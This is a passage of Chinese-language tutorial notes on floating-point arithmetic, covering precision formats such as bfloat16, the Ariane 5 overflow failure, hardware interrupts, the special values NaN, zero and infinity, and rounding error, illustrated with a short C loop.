<td><strong>扩展精度（extended）</strong></td>
<td>1</td>
<td>15</td>
<td>64</td>
<td>80</td>
<td>~19.2 位</td>
</tr>
<tr>
<td><strong>四倍精度（quadruple）</strong></td>
<td>1</td>
<td>15</td>
<td>112</td>
<td>128</td>
<td>~34.0 位</td>
</tr>
<tr>
<td><strong>bfloat16</strong></td>
<td>1</td>
<td>8</td>
<td>7</td>
<td>16</td>
<td>~2.3 位</td>
</tr>
</tbody>
</table>
<p><strong>不同格式的应用</strong></p>
<ul>
<li><strong>单精度（float）和双精度（double）</strong>：大多数 CPU
都支持，C 语言中的 <code>float</code> 和 <code>double</code>
对应这两种格式。</li>
<li><strong>扩展精度（extended）</strong>：主要用于 <strong>x86
架构</strong>，C 语言中的 <code>long double</code> 通常是 <strong>80
位</strong>（部分 ARM 架构降级为 64 位）。</li>
<li><strong>四倍精度（quadruple）和 256
位“八倍精度”</strong>：主要用于高精度科学计算，不受主流硬件支持。</li>
<li><strong>半精度（half）</strong>：由于存储空间小、计算快，常用于
<strong>深度学习</strong> 和 <strong>计算机图形学</strong>。</li>
<li><strong>bfloat16</strong>：牺牲 3
位尾数，以获得与单精度相同的指数范围，适用于
<strong>机器学习</strong>（尤其是 <strong>神经网络</strong>）。</li>
</ul>
<p>较低精度的浮点数<strong>占用更少的存储空间</strong>，在某些应用场景下可以大幅提高运算速度。例如：</p>
<ul>
<li><strong>深度学习</strong>
中，通常不需要很高的数值精度，而是更关注计算吞吐量和并行性。</li>
<li><strong>Google TPU（张量处理单元）</strong> 专门为
<code>bfloat16</code> 设计，并能够 <strong>一次性计算 128×128
的矩阵乘法</strong>。</li>
<li><strong>NVIDIA Tensor Cores</strong> 可 <strong>一次执行 4×4
的矩阵运算</strong>，显著加速深度学习任务。</li>
</ul>
<h5 id="处理边界情况">处理边界情况</h5>
<p>默认情况下，整数运算在遇到<strong>边界情况（Corner
Cases）</strong>（例如<strong>除零</strong>）时，会导致程序<strong>崩溃</strong>。1996
年，<strong>阿丽亚娜 5 号（Ariane 5）</strong>
运载火箭<strong>首飞失败</strong>，原因就是计算系统在遇到<strong>算术错误</strong>时采取了<strong>终止计算</strong>的策略。具体来说，这次错误是由于<strong>浮点数转换为整数时溢出</strong>（Floating-point
to Integer
Overflow）。这个错误导致<strong>导航系统错误地认为火箭偏离了轨道</strong>，于是计算机进行了<strong>大幅修正</strong>，最终导致火箭解体，直接损失
<strong>2 亿美元（$200M）</strong>。</p>
<p><strong>硬件中断（Hardware Interrupts）</strong>
提供了一种更优雅的方式来处理异常情况。</p>
<p>当程序发生异常时，CPU 会：</p>
<ol type="1">
<li><strong>中断程序的执行（Interrupt Execution）</strong>。</li>
<li><strong>收集所有相关信息</strong>，并存入一个特殊的数据结构，称为
<strong>“中断向量（Interrupt Vector）”</strong>。</li>
<li>将中断向量交给<strong>操作系统</strong>（OS）
<ul>
<li>如果程序提供了<strong>异常处理代码</strong>（类似于
<code>try-except</code> 机制），OS 会调用处理代码。</li>
<li>如果没有，则直接<strong>终止程序</strong>。</li>
</ul></li>
</ol>
<p>硬件中断虽然可以优雅地处理异常，但<strong>速度很慢</strong>，不适合<strong>实时系统</strong>（如火箭导航）。</p>
<h5 id="nans零和无穷大">NaNs、零和无穷大</h5>
<table>
<colgroup>
<col style="width: 19%">
<col style="width: 19%">
<col style="width: 39%">
<col style="width: 22%">
</colgroup>
<thead>
<tr>
<th><strong>类型</strong></th>
<th><strong>特点</strong></th>
<th><strong>数学运算</strong></th>
<th><strong>二进制表示</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>无穷大（Infinity）</strong></td>
<td>由于数值溢出产生</td>
<td><span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="11.602ex" height="1.505ex" role="img" focusable="false" viewBox="0 -583 5128 665"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="221E" d="M55 217Q55 305 111 373T254 442Q342 442 419 381Q457 350 493 303L507 284L514 294Q618 442 747 442Q833 442 888 374T944 214Q944 128 889 59T743 -11Q657 -11 580 50Q542 81 506 128L492 147L485 137Q381 -11 252 -11Q166 -11 111 57T55 217ZM907 217Q907 285 869 341T761 397Q740 397 720 392T682 378T648 359T619 335T594 310T574 285T559 263T548 246L543 238L574 198Q605 158 622 138T664 94T714 61T765 51Q827 51 867 100T907 217ZM92 214Q92 145 131 89T239 33Q357 33 456 193L425 233Q364 312 334 337Q285 380 233 380Q171 380 132 331T92 214Z"></path></g><g data-mml-node="mo" transform="translate(1222.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(2222.4,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(3072.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(4128,0)"><path data-c="221E" d="M55 217Q55 305 111 373T254 442Q342 442 419 381Q457 350 493 303L507 284L514 294Q618 442 747 442Q833 442 888 374T944 214Q944 128 889 59T743 -11Q657 -11 580 50Q542 81 506 128L492 147L485 137Q381 -11 252 -11Q166 -11 111 57T55 217ZM907 217Q907 285 869 341T761 397Q740 397 720 392T682 378T648 359T619 335T594 310T574 285T559 263T548 246L543 238L574 198Q605 158 622 138T664 94T714 61T765 51Q827 51 867 100T907 217ZM92 214Q92 145 131 89T239 33Q357 33 456 193L425 233Q364 312 334 337Q285 380 233 380Q171 380 132 331T92 214Z"></path></g></g></g></svg></mjx-container></span>，<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="8.836ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3905.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(572,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="mi" transform="translate(1072,0)"><path data-c="221E" d="M55 217Q55 305 111 373T254 442Q342 442 419 381Q457 350 493 303L507 284L514 294Q618 442 747 442Q833 442 888 374T944 214Q944 128 889 59T743 -11Q657 -11 580 50Q542 81 506 128L492 147L485 137Q381 -11 252 -11Q166 -11 111 57T55 217ZM907 217Q907 285 869 341T761 397Q740 397 720 392T682 378T648 359T619 335T594 310T574 285T559 263T548 246L543 238L574 198Q605 158 622 138T664 94T714 61T765 51Q827 51 867 100T907 217ZM92 214Q92 145 131 89T239 33Q357 33 456 193L425 233Q364 312 334 337Q285 380 233 380Q171 380 132 331T92 214Z"></path></g><g data-mml-node="mo" transform="translate(2349.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(3405.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></svg></mjx-container></span></td>
<td><strong>指数全 1，尾数全 0</strong></td>
</tr>
<tr>
<td><strong>正零（+0.0）</strong></td>
<td>可能导致优化问题</td>
<td><span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="13.199ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 5834 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(500,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="mo" transform="translate(1222.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(2222.4,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(3000.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(4056,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(4834,0)"><path data-c="221E" d="M55 217Q55 305 111 373T254 442Q342 442 419 381Q457 350 493 303L507 284L514 294Q618 442 747 442Q833 442 888 374T944 214Q944 128 889 59T743 -11Q657 -11 580 50Q542 81 506 128L492 147L485 137Q381 -11 252 -11Q166 -11 111 57T55 217ZM907 217Q907 285 869 341T761 397Q740 397 720 392T682 378T648 359T619 335T594 310T574 285T559 263T548 246L543 238L574 198Q605 158 622 138T664 94T714 61T765 51Q827 51 867 100T907 217ZM92 214Q92 145 131 89T239 33Q357 33 456 193L425 233Q364 312 334 337Q285 380 233 380Q171 380 132 331T92 214Z"></path></g></g></g></svg></mjx-container></span></td>
<td><strong>所有位为 0</strong></td>
</tr>
<tr>
<td><strong>负零（-0.0）</strong></td>
<td>更适合作为初始化值</td>
<td><span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="13.199ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 5834 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(500,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="mo" transform="translate(1222.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(2222.4,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(3000.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(4056,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(4834,0)"><path data-c="221E" d="M55 217Q55 305 111 373T254 442Q342 442 419 381Q457 350 493 303L507 284L514 294Q618 442 747 442Q833 442 888 374T944 214Q944 128 889 59T743 -11Q657 -11 580 50Q542 81 506 128L492 147L485 137Q381 -11 252 -11Q166 -11 111 57T55 217ZM907 217Q907 285 869 341T761 397Q740 397 720 392T682 378T648 359T619 335T594 310T574 285T559 263T548 246L543 238L574 198Q605 158 622 138T664 94T714 61T765 51Q827 51 867 100T907 217ZM92 214Q92 145 131 89T239 33Q357 33 456 193L425 233Q364 312 334 337Q285 380 233 380Q171 380 132 331T92 214Z"></path></g></g></g></svg></mjx-container></span></td>
<td><strong>符号位 1，其余 0</strong></td>
</tr>
<tr>
<td><strong>NaN（非数）</strong></td>
<td>计算非法数学运算时出现</td>
<td><span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="7.291ex" height="1.505ex" role="img" focusable="false" viewBox="0 -583 3222.4 665"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="221E" d="M55 217Q55 305 111 373T254 442Q342 442 419 381Q457 350 493 303L507 284L514 294Q618 442 747 442Q833 442 888 374T944 214Q944 128 889 59T743 -11Q657 -11 580 50Q542 81 506 128L492 147L485 137Q381 -11 252 -11Q166 -11 111 57T55 217ZM907 217Q907 285 869 341T761 397Q740 397 720 392T682 378T648 359T619 335T594 310T574 285T559 263T548 246L543 238L574 198Q605 158 622 138T664 94T714 61T765 51Q827 51 867 100T907 217ZM92 214Q92 145 131 89T239 33Q357 33 456 193L425 233Q364 312 334 337Q285 380 233 380Q171 380 132 331T92 214Z"></path></g><g data-mml-node="mo" transform="translate(1222.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(2222.4,0)"><path data-c="221E" d="M55 217Q55 305 111 373T254 442Q342 442 419 381Q457 350 493 303L507 284L514 294Q618 442 747 442Q833 442 888 374T944 214Q944 128 889 59T743 -11Q657 -11 580 50Q542 81 506 128L492 147L485 137Q381 -11 252 -11Q166 -11 111 57T55 217ZM907 217Q907 285 869 341T761 397Q740 397 720 392T682 378T648 359T619 335T594 310T574 285T559 263T548 246L543 238L574 198Q605 158 622 138T664 94T714 61T765 51Q827 51 867 100T907 217ZM92 214Q92 145 131 89T239 33Q357 33 456 193L425 233Q364 312 334 337Q285 380 233 380Q171 380 132 331T92 214Z"></path></g></g></g></svg></mjx-container></span>, <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="6.159ex" height="1.557ex" role="img" focusable="false" viewBox="0 -666 2722.4 688"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(722.2,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(1722.4,0)"><path data-c="221E" d="M55 217Q55 305 111 373T254 442Q342 442 419 381Q457 350 493 303L507 284L514 294Q618 442 747 442Q833 442 888 374T944 214Q944 128 889 59T743 -11Q657 -11 580 50Q542 81 506 128L492 147L485 137Q381 -11 252 -11Q166 -11 111 57T55 217ZM907 217Q907 285 869 341T761 397Q740 397 720 392T682 378T648 359T619 335T594 310T574 285T559 263T548 246L543 238L574 198Q605 158 622 138T664 94T714 61T765 51Q827 51 867 100T907 217ZM92 214Q92 145 131 89T239 33Q357 33 456 193L425 233Q364 312 334 337Q285 380 233 380Q171 380 132 331T92 214Z"></path></g></g></g></svg></mjx-container></span>, <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="3.394ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 1500 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(500,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="mn" transform="translate(1000,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></svg></mjx-container></span></td>
<td><strong>指数全 1，尾数非 0</strong></td>
</tr>
<tr>
<td><strong>信号 NaN（sNaN）</strong></td>
<td>触发异常标志</td>
<td>可能引发中断</td>
<td><strong>指数全 1，尾数部分非 0</strong></td>
</tr>
<tr>
<td><strong>静默 NaN（qNaN）</strong></td>
<td>在计算中传播</td>
<td>结果仍然是 NaN</td>
<td><strong>指数全 1，尾数部分非 0</strong></td>
</tr>
</tbody>
</table>
<h4 id="舍入误差">舍入误差</h4>
<p>硬件浮点数的舍入方式非常简单：<strong>只有当运算结果无法精确表示时才会发生舍入</strong>，默认情况下<strong>向最接近的可表示数舍入</strong>（如果有两个同样接近的候选值，则<strong>优先选择以
0 结尾的那个</strong>）。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">float</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (<span class="number">1</span> &lt;&lt; <span class="number">25</span>); i++)</span><br><span class="line">    x++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%f\n"</span>, x);</span><br></pre></td></tr></table></figure></div>
<p><strong>预期数学结果</strong>： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="14.986ex" height="2.185ex" role="img" focusable="false" viewBox="0 -883.9 6623.7 965.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1567.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(2623.7,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(500,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1000,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1500,0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(2000,0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(2500,0)"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(3000,0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(3500,0)"></path></g></g></g></svg></mjx-container></span> 但实际输出的是： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" 